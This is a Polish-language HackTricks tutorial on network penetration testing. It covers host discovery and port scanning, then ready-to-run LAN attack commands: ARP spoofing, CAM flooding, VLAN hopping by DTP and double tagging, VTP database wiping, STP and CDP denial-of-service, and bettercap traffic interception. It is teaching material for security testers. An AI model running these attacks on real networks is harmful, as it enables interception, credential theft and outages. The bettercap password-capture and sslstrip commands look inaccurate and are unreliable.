# Testowanie penetracyjne sieci

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Wskazówka dotycząca bug bounty**: **zarejestruj się** na platformie **Intigriti**, premium **platformie bug bounty stworzonej przez hakerów, dla hakerów**! Dołącz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) już dziś i zacznij zarabiać nagrody do **100 000 USD**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Odkrywanie hostów z zewnątrz

To będzie **krótka sekcja** dotycząca sposobu znajdowania **odpowiadających na zewnątrz IP**.\
W tej sytuacji masz pewien **zakres adresów IP** (może nawet kilka **zakresów**) i chcesz po prostu znaleźć **które adresy IP odpowiadają**.

### ICMP

To jest **najłatwiejszy** i **najszybszy** sposób na sprawdzenie, czy host jest dostępny czy nie.\
Możesz spróbować wysłać kilka pakietów **ICMP** i **oczekiwać odpowiedzi**. Najprostszym sposobem jest wysłanie **żądania echo** i oczekiwanie na odpowiedź. Możesz to zrobić za pomocą prostego polecenia `ping` lub używając `fping` dla **zakresów**.\
Możesz również użyć **nmapa**, aby wysłać inne rodzaje pakietów ICMP (to pozwoli uniknąć filtrów dla standardowych żądań i odpowiedzi ICMP).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Odkrywanie portów TCP

Bardzo często zdarza się, że wszystkie rodzaje pakietów ICMP są filtrowane. W takim przypadku jedyną możliwością sprawdzenia, czy host jest aktywny, jest **sprawdzenie otwartych portów**. Każdy host ma **65535 portów**, więc jeśli masz "duży" zakres, **nie możesz** sprawdzić, czy **każdy port** każdego hosta jest otwarty czy nie, to zajęłoby zbyt dużo czasu.\
W takim przypadku potrzebujesz **szybkiego skanera portów** ([masscan](https://github.com/robertdavidgraham/masscan)) oraz listy **najczęściej używanych portów:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Możesz również wykonać ten krok za pomocą `nmap`, ale jest to wolniejsze i `nmap` ma pewne problemy z identyfikacją aktywnych hostów.

### Odkrywanie portów HTTP

Jest to po prostu odkrywanie portów TCP przydatne, gdy chcesz **skupić się na odkrywaniu usług HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Odkrywanie portów UDP

Możesz również spróbować sprawdzić, czy istnieje **otwarty port UDP**, aby zdecydować, czy powinieneś **zwrócić większą uwagę** na danego **hosta**. Ponieważ usługi UDP zazwyczaj **nie odpowiadają** żadnymi danymi na zwykły pusty pakiet sondy UDP, trudno jest stwierdzić, czy port jest filtrowany czy otwarty. Najłatwiejszym sposobem na podjęcie decyzji jest wysłanie pakietu związanego z działającą usługą, a ponieważ nie wiesz, jaka usługa jest uruchomiona, powinieneś spróbować najbardziej prawdopodobnej na podstawie numeru portu:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Linia nmap zaproponowana wcześniej sprawdzi **1000 najważniejszych portów UDP** w każdym hoście w zakresie **/24**, ale nawet to zajmie **>20 minut**. Jeśli potrzebujesz **najszybszych wyników**, możesz użyć [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` To wyśle te **sondy UDP** do ich **oczekiwanego portu** (dla zakresu /24 zajmie to tylko 1 minutę): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Odkrywanie portów SCTP
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Testowanie penetracyjne Wifi

Tutaj znajdziesz ładny przewodnik po wszystkich znanych atakach na Wifi w momencie pisania:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Odkrywanie hostów od wewnątrz

Jeśli jesteś wewnątrz sieci, jedną z pierwszych rzeczy, które chcesz zrobić, jest **odkrycie innych hostów**. W zależności od **ilości hałasu**, który możesz/chcesz wygenerować, można podjąć różne działania:

### Pasywne

Możesz użyć tych narzędzi do pasywnego odkrywania hostów w podłączonej sieci:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktywne

Należy zauważyć, że techniki omówione w [_**Odkrywanie hostów z zewnątrz**_](./#odkrywanie-hostów-z-zewnątrz) (_Odkrywanie portów TCP/HTTP/UDP/SCTP_) mogą być również **zastosowane tutaj**.\
Jednak, będąc w **tym samym sieci** co inne hosty, możesz zrobić **więcej rzeczy**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Aktywny ICMP

Zauważ, że techniki omówione w sekcji _Odkrywanie hostów z zewnątrz_ ([_**ICMP**_](./#icmp)) mogą być również **zastosowane tutaj**.\
Ale, ponieważ jesteś w **tym samym sieci** co inne hosty, możesz zrobić **więcej rzeczy**:

* Jeśli **pingujesz** adres **rozgłoszeniowy podsieci**, ping powinien dotrzeć do **każdego hosta**, a oni mogą do ciebie **odpowiedzieć**: `ping -b 10.10.5.255`
* Pinguje adres **rozgłoszeniowy sieci**, możesz nawet znaleźć hosty wewnątrz **innych podsieci**: `ping -b 255.255.255.255`
* Użyj flag `-PE`, `-PP`, `-PM` w `nmap`, aby przeprowadzić odkrywanie hostów, wysyłając odpowiednio **żądania ICMPv4 echo**, **timestamp** i **maski podsieci**: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan służy do **włączania** komputerów za pomocą **wiadomości sieciowej**. Magiczny pakiet używany do włączenia komputera to pakiet, w którym podany jest **adres MAC docelowy**, a następnie jest **powtórzony 16 razy** w tym samym pakiecie.\
Tego rodzaju pakiety są zazwyczaj wysyłane w ramach **ethernetu 0x0842** lub w pakiecie **UDP na porcie 9**.\
Jeśli nie podano **\[adresu MAC]**, pakiet jest wysyłany do **rozgłoszeniowego adresu MAC** (a adres MAC rozgłoszeniowy zostanie powtórzony).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Skanowanie hostów

Po odkryciu wszystkich adresów IP (zewnętrznych lub wewnętrznych), które chcesz dokładnie zbadać, można podjąć różne działania.

### TCP

* **Otwarty** port: _SYN --> SYN/ACK --> RST_
* **Zamknięty** port: _SYN --> RST/ACK_
* **Filtrowany** port: _SYN --> \[BRAK ODPOWIEDZI]_
* **Filtrowany** port: _SYN --> wiadomość ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Istnieją 2 opcje skanowania portu UDP:

* Wyślij **pakiet UDP** i sprawdź odpowiedź _**ICMP unreachable**_ jeśli port jest **zamknięty** (w niektórych przypadkach ICMP będzie **filtrowany**, więc nie otrzymasz żadnych informacji, czy port jest zamknięty czy otwarty).
* Wyślij **sformatowane datagramy** w celu uzyskania odpowiedzi od **usługi** (np. DNS, DHCP, TFTP i inne, jak wymienione w _nmap-payloads_). Jeśli otrzymasz **odpowiedź**, to port jest **otwarty**.

**Nmap** będzie **łączyć obie** opcje, używając "-sV" (skanowanie UDP jest bardzo wolne), ale zauważ, że skanowanie UDP jest wolniejsze niż skanowanie TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### Skan SCTP

**SCTP (Stream Control Transmission Protocol)** został zaprojektowany do współpracy z **TCP (Transmission Control Protocol)** i **UDP (User Datagram Protocol)**. Jego głównym celem jest ułatwienie transportu danych telefonicznych w sieciach IP, odzwierciedlając wiele cech niezawodności znalezionych w **Signaling System 7 (SS7)**. **SCTP** jest podstawowym składnikiem rodziny protokołów **SIGTRAN**, które mają na celu transport sygnałów SS7 w sieciach IP.

Wsparcie dla **SCTP** jest dostarczane przez różne systemy operacyjne, takie jak **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** i **VxWorks**, co wskazuje na jego szerokie akceptowanie i użyteczność w dziedzinie telekomunikacji i sieci.

Nmap oferuje dwa różne skany dla SCTP: _-sY_ i _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### Unikanie wykrycia przez IDS i IPS

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **Więcej opcji nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Ujawnianie wewnętrznych adresów IP

**Niekonfigurowane routery, zapory sieciowe i urządzenia sieciowe** czasami odpowiadają na sondy sieciowe, używając **niepublicznych adresów źródłowych**. Aby zidentyfikować pakiety otrzymane z prywatnych adresów podczas testowania, można użyć narzędzia **tcpdump**. W szczególności, na systemie Kali Linux, pakiety można przechwycić na interfejsie **eth2**, który jest dostępny z publicznego Internetu. Ważne jest jednak zauważenie, że jeśli twoje środowisko jest za NAT-em lub zapora sieciową, takie pakiety prawdopodobnie zostaną odfiltrowane.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Podczas sniffingu możesz dowiedzieć się szczegółów dotyczących zakresów adresów IP, rozmiarów podsieci, adresów MAC i nazw hostów, analizując przechwycone ramki i pakiety. Jeśli sieć jest źle skonfigurowana lub przełącznik jest obciążony, atakujący mogą przechwycić poufne informacje za pomocą pasywnego sniffingu sieciowego.

Jeśli sieć Ethernet z przełącznikami jest poprawnie skonfigurowana, zobaczysz tylko ramki rozgłoszeniowe i materiał przeznaczony dla twojego adresu MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Można również przechwytywać pakiety z zdalnej maszyny podczas sesji SSH za pomocą Wiresharka jako interfejsu graficznego w czasie rzeczywistym.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
Bettercap jest narzędziem do ataków Man-in-the-Middle (MitM) i analizy sieciowej. Może być używany do przechwytywania ruchu sieciowego, przechwytywania haseł, przekierowywania ruchu, ataków SSL/TLS i wielu innych zastosowań związanych z testowaniem penetracyjnym. Poniżej przedstawiono kilka przykładów użycia Bettercap:

#### Przechwytywanie ruchu HTTP
```bash
sudo bettercap -X
```

#### Przechwytywanie haseł HTTP
```bash
sudo bettercap -X --proxy-module injecthtml --html-content 'login.html' --html-proxy
```

#### Przekierowywanie ruchu HTTP
```bash
sudo bettercap -X --proxy-module injecthtml --html-content 'redirect.html' --html-proxy
```

#### Atak SSL/TLS
```bash
sudo bettercap -X --proxy-module sslstrip --sslstrip-listen 0.0.0.0 --sslstrip-ports 80,443
```

Bettercap jest potężnym narzędziem, które może być używane w różnych scenariuszach testowania penetracyjnego. Pamiętaj jednak, że używanie go do nielegalnych działań jest niezgodne z prawem i może prowadzić do konsekwencji prawnych.
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Oczywiście.

### Przechwytywanie danych uwierzytelniających

Możesz użyć narzędzi takich jak [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz), aby analizować dane uwierzytelniające z pliku pcap lub interfejsu na żywo.

## Ataki w sieci LAN

### Podszycie ARP

Podszycie ARP polega na wysyłaniu fałszywych odpowiedzi ARP, aby wskazać, że IP danego urządzenia ma MAC naszego urządzenia. Następnie, ofiara zmieni tabelę ARP i będzie kontaktować się z naszym urządzeniem za każdym razem, gdy chce skontaktować się z podszywanym adresem IP.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**

Arpspoof to narzędzie, które umożliwia atakującemu podszywanie się pod inną maszynę w sieci lokalnej. Działa poprzez wysyłanie fałszywych odpowiedzi ARP (Address Resolution Protocol) do celu ataku, co powoduje, że cel myśli, że atakujący jest prawdziwym urządzeniem sieciowym. W rezultacie ruch sieciowy, który normalnie byłby kierowany do celu, zostaje przekierowany do atakującego. Ten atak może być wykorzystany do przechwytywania danych, przekierowywania ruchu sieciowego lub prowadzenia ataków typu man-in-the-middle.
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### Przepełnienie MAC - przepełnienie CAM

Przepełnij tabelę CAM przełącznika, wysyłając wiele pakietów z różnym adresem MAC źródłowego. Gdy tabela CAM jest pełna, przełącznik zaczyna zachowywać się jak koncentrator (rozgłaszając cały ruch).
```bash
macof -i <interface>
```
W nowoczesnych przełącznikach ta podatność została naprawiona.

### Ataki 802.1Q VLAN / DTP

#### Dynamiczne Trunkowanie

**Dynamiczny Protokół Trunkowania (DTP)** został zaprojektowany jako protokół warstwy łącza umożliwiający automatyczny system trunkowania, pozwalając przełącznikom automatycznie wybierać porty w trybie trunk (Trunk) lub trybie non-trunk. Wdrożenie **DTP** jest często uważane za oznakę suboptymalnego projektu sieciowego, podkreślając znaczenie ręcznej konfiguracji trunków tylko tam, gdzie jest to konieczne, oraz zapewnienia odpowiedniej dokumentacji.

Domyślnie porty przełącznika są ustawione na tryb Dynamic Auto, co oznacza, że są gotowe do inicjowania trunkowania, jeśli zostaną do tego zmuszone przez sąsiedni przełącznik. Problem związany z bezpieczeństwem pojawia się, gdy pentester lub atakujący podłącza się do przełącznika i wysyła ramkę DTP Desirable, zmuszając port do wejścia w tryb trunk. Ta akcja umożliwia atakującemu wyliczenie VLAN-ów poprzez analizę ramek STP i obejście segmentacji VLAN poprzez konfigurację wirtualnych interfejsów.

Obecność DTP w wielu przełącznikach domyślnie może być wykorzystana przez przeciwników do naśladowania zachowania przełącznika, co umożliwia dostęp do ruchu we wszystkich VLAN-ach. Skrypt [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) jest wykorzystywany do monitorowania interfejsu, ujawniając, czy przełącznik jest w trybie Default, Trunk, Dynamic, Auto lub Access - ten ostatni jest jedyną konfiguracją odporną na ataki VLAN hopping. Narzędzie to ocenia podatność przełącznika.

Jeśli zostanie zidentyfikowana podatność sieciowa, można użyć narzędzia _**Yersinia**_ do "włączenia trunkowania" za pomocą protokołu DTP, co umożliwia obserwację pakietów ze wszystkich VLAN-ów.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

Aby wyliczyć VLAN-y, można również wygenerować ramkę DTP Desirable za pomocą skryptu [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. Nie przerywaj skryptu pod żadnym pozorem. Wstrzykuje on ramkę DTP Desirable co trzy sekundy. **Dynamicznie tworzone kanały trunk na przełączniku istnieją tylko przez pięć minut. Po upływie pięciu minut kanał trunk zostaje usunięty.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Chciałbym zauważyć, że **Access/Desirable (0x03)** oznacza, że ramka DTP jest typu Desirable, co mówi portowi, aby przełączył się w tryb Trunk. A **802.1Q/802.1Q (0xa5)** oznacza typ enkapsulacji **802.1Q**.

Analizując ramki STP, **dowiedzieliśmy się o istnieniu VLAN 30 i VLAN 60**.

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### Atakowanie konkretnych VLANów

Gdy znasz identyfikatory VLAN i wartości IP, możesz **skonfigurować wirtualny interfejs, aby zaatakować konkretny VLAN**.\
Jeśli DHCP nie jest dostępne, użyj polecenia _ifconfig_, aby ustawić statyczny adres IP.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatyczny skaczący VLAN

Omawiany atak na **Dynamiczne Trunkowanie i tworzenie wirtualnych interfejsów oraz odkrywanie hostów w innych VLAN-ach** jest **automatycznie wykonywany** przez narzędzie: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Podwójne oznaczanie

Jeśli atakujący zna wartość **MAC, IP i ID VLAN-u hosta ofiary**, może spróbować **podwójnie oznaczyć ramkę** z wyznaczonym VLAN-em i VLAN-em ofiary, a następnie wysłać pakiet. Ponieważ **ofiara nie będzie w stanie nawiązać połączenia z atakującym**, najlepszą opcją dla atakującego jest komunikacja za pomocą protokołów UDP, które mogą wykonywać interesujące działania (np. SNMP).

Inną opcją dla atakującego jest uruchomienie **skanowania portów TCP, podszywając się pod kontrolowany przez atakującego adres IP, dostępny dla ofiary** (prawdopodobnie przez internet). Następnie atakujący może podsłuchiwać drugi host, który jest w jego posiadaniu, czy otrzymuje pakiety od ofiary.

![](<../../.gitbook/assets/image (635) (1).png>)

Aby przeprowadzić ten atak, można użyć narzędzia scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Ominięcie segmentacji VLAN na poziomie Lateral <a href="#d679" id="d679"></a>

Jeśli masz **dostęp do przełącznika, do którego jesteś bezpośrednio podłączony**, masz możliwość **ominięcia segmentacji VLAN** w sieci. Wystarczy **przełączyć port w tryb trunk** (znany również jako trunk), utworzyć wirtualne interfejsy o identyfikatorach docelowych VLAN i skonfigurować adres IP. Możesz spróbować żądać adresu dynamicznie (DHCP) lub skonfigurować go statycznie. To zależy od przypadku.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Ominięcie warstwy 3 prywatnego VLAN

W niektórych środowiskach, takich jak sieci bezprzewodowe dla gości, stosuje się ustawienia **izolacji portów (znane również jako prywatne VLAN)**, aby zapobiec bezpośredniej komunikacji klientów podłączonych do punktu dostępowego. Jednak zidentyfikowano technikę, która może obejść te środki izolacji. Technika ta wykorzystuje brak list ACL sieciowych lub ich nieprawidłową konfigurację, umożliwiając przekierowanie pakietów IP przez router, aby dotrzeć do innego klienta w tej samej sieci.

Atak jest wykonywany poprzez utworzenie **pakietu, który przenosi adres IP docelowego klienta, ale z adresem MAC routera**. Powoduje to błędne przekierowanie pakietu przez router do klienta docelowego. Ta metoda jest podobna do stosowanej w atakach podwójnego oznaczania, gdzie wykorzystuje się możliwość kontrolowania hosta dostępnego dla ofiary w celu wykorzystania luki w zabezpieczeniach.

**Kluczowe kroki ataku:**
1. **Tworzenie pakietu:** Pakiet jest specjalnie przygotowany tak, aby zawierał adres IP docelowego klienta, ale z adresem MAC routera.
2. **Wykorzystanie zachowania routera:** Przygotowany pakiet jest wysyłany do routera, który z powodu konfiguracji przekierowuje pakiet do klienta docelowego, omijając izolację zapewnianą przez ustawienia prywatnego VLAN.

### Ataki VTP

VTP (VLAN Trunking Protocol) centralizuje zarządzanie VLAN. Wykorzystuje numery rewizji do utrzymania integralności bazy danych VLAN; każda modyfikacja zwiększa ten numer. Przełączniki przyjmują konfiguracje o wyższych numerach rewizji, aktualizując swoje własne bazy danych VLAN.

#### Role domeny VTP

- **Serwer VTP:** Zarządza VLAN - tworzy, usuwa, modyfikuje. Rozgłasza ogłoszenia VTP do członków domeny.
- **Klient VTP:** Odbiera ogłoszenia VTP w celu zsynchronizowania swojej bazy danych VLAN. Ta rola jest ograniczona od dokonywania lokalnych modyfikacji konfiguracji VLAN.
- **Transparentny VTP:** Nie uczestniczy w aktualizacjach VTP, ale przekazuje ogłoszenia VTP. Niezależnie od ataków VTP, utrzymuje stały numer rewizji równy zero.

#### Typy ogłoszeń VTP

- **Ogłoszenie podsumowujące:** Rozgłaszane przez serwer VTP co 300 sekund, zawierające podstawowe informacje o domenie.
- **Ogłoszenie podzbiory:** Wysyłane po zmianach konfiguracji VLAN.
- **Żądanie ogłoszenia:** Wystawiane przez klienta VTP w celu żądania ogłoszenia podsumowującego, zwykle w odpowiedzi na wykrycie wyższego numeru rewizji konfiguracji.

Podatności VTP można wykorzystać wyłącznie za pośrednictwem portów trunk, ponieważ ogłoszenia VTP krążą tylko przez nie. Scenariusze ataków po DTP mogą skierować się w stronę VTP. Narzędzia takie jak Yersinia mogą ułatwić ataki VTP, mające na celu usunięcie bazy danych VLAN i skuteczne zakłócenie sieci.

Uwaga: Ta dyskusja dotyczy wersji VTP 1 (VTPv1).
```bash
%% yersinia -G # Launch Yersinia in graphical mode ```
```
W trybie graficznym Yersinii wybierz opcję usuwania wszystkich VLAN VTP, aby wyczyścić bazę danych VLAN.


### Ataki STP

**Jeśli nie możesz przechwycić ramek BPDU na swoich interfejsach, mało prawdopodobne, że uda ci się przeprowadzić atak STP.**

#### **Atak STP BPDU DoS**

Wysyłając dużo ramek BPDUs TCP (Topology Change Notification) lub Conf (BPDUs wysyłane podczas tworzenia topologii), przeładowuje się przełączniki i przestają działać poprawnie.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Atak STP TCP**

Kiedy zostanie wysłany pakiet TCP, tabela CAM przełączników zostanie usunięta po 15 sekundach. Jeśli będziesz ciągle wysyłać tego rodzaju pakiety, tabela CAM będzie ciągle restartowana (co 15 sekund) i po restarcie przełącznik zachowuje się jak koncentrator (hub).
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Atak STP Root**

Atakujący symuluje zachowanie przełącznika, aby stać się korzeniem STP w sieci. Wtedy większa ilość danych będzie przechodzić przez niego. Jest to interesujące, gdy jesteś podłączony do dwóch różnych przełączników.\
To jest osiągane poprzez wysyłanie pakietów BPDUs CONF, które mówią, że wartość **priorytetu** jest mniejsza niż rzeczywisty priorytet rzeczywistego przełącznika korzenia.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Jeśli atakujący jest podłączony do 2 przełączników, może stać się korzeniem nowego drzewa i cały ruch między tymi przełącznikami będzie przechodził przez niego** (atakuje wtedy metodą MITM).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Ataki CDP

Protokół odkrywania CISCO (CDP) jest niezbędny do komunikacji między urządzeniami CISCO, umożliwiając im **identyfikację siebie nawzajem i udostępnianie szczegółów konfiguracji**.

#### Pasywne zbieranie danych <a href="#0e0f" id="0e0f"></a>

CDP jest skonfigurowany do rozgłaszania informacji przez wszystkie porty, co może prowadzić do ryzyka bezpieczeństwa. Atakujący, po podłączeniu do portu przełącznika, może zainstalować narzędzia do przechwytywania sieci, takie jak **Wireshark**, **tcpdump** lub **Yersinia**. Ta akcja może ujawnić wrażliwe dane na temat urządzenia sieciowego, w tym jego modelu i wersji systemu Cisco IOS. Atakujący może następnie skierować się do konkretnych podatności zidentyfikowanej wersji Cisco IOS.

#### Wywoływanie przepełnienia tabeli CDP <a href="#0d6a" id="0d6a"></a>

Bardziej agresywne podejście polega na uruchomieniu ataku typu Denial of Service (DoS), przytłaczając pamięć przełącznika, udając prawidłowe urządzenia CISCO. Poniżej przedstawiono sekwencję poleceń do uruchomienia takiego ataku za pomocą narzędzia sieciowego Yersinia, przeznaczonego do testowania:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Podczas tego ataku, CPU przełącznika oraz tabela sąsiadów CDP są znacznie obciążone, co prowadzi do tego, co często nazywane jest **"paraliżem sieci"** z powodu nadmiernego zużycia zasobów.

#### Atak podszywania się pod CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Możesz również użyć [**scapy**](https://github.com/secdev/scapy/). Upewnij się, że zainstalowałeś go z pakietem `scapy/contrib`.

### Ataki VoIP i narzędzie VoIP Hopper

Telefony VoIP, coraz bardziej zintegrowane z urządzeniami IoT, oferują funkcje takie jak odblokowywanie drzwi lub kontrolowanie termostatów za pomocą specjalnych numerów telefonów. Jednak ta integracja może stwarzać ryzyko bezpieczeństwa.

